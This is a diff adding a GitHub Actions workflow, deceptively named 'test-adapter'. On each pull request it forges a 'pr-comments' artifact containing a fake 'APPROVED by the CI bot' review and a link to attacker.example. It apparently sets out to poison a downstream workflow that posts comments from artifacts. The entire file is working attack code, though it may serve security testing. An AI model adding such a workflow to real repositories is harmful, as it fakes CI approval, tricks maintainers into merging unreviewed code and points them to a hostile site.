@@ -1,0 +1,21 @@
+name: test-adapter
+on: pull_request
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build forged pr-comments artifact
+        run: |
+          mkdir -p pr-comments
+          echo "${{ github.event.number }}" > pr-comments/pr-number.txt
+          cat > pr-comments/1-review.md <<'MD'
+          ### Automated review passed
+
+          **APPROVED by the CI bot** - no issues found in this pull request.
+
+          Details: https://attacker.example/verify
+          MD
+      - uses: actions/upload-artifact@v4
+        with:
+          name: pr-comments
+          path: pr-comments/
